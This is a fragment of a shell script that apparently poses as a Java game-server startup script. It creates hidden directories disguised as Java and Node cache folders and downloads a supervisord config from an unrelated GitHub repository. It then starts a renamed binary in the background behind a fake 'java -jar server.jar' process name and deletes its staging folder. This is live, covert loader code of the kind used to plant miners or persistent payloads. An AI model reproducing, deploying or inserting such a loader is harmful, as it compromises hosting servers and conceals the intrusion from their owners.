...
function fetch_files() {
    mkdir -p /tmp/.java/bin/{.a,.b}  /tmp/node-compile-cache/v24.14.1-x64-cf738c9d-0/{etc,log}
    ...
    cd /tmp/node-compile-cache/v24.14.1-x64-cf738c9d-0/etc && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/de-pxl/n1.conf -o supervisord.conf
...
function start_app() {
    ...
    cd /tmp/node-compile-cache/v24.14.1-x64-cf738c9d-0/log && nohup /tmp/.java/bin/uid ~~m ~~n 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ~~f /tmp/.java/bin/java >/dev/null 2>&1 &
}

if [ -f "/tmp/.java/bin/java" ] && [ -f "/tmp/.java/bin/.a/java" ] && [ -f "/tmp/.java/bin/.b/java" ]; then
    start_app
    # timeout 2s tail -f /dev/null
    cd /home/container/ && rm -rf /tmp/node-compile-cache/v24.14.1-x64-cf738c9d-0
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
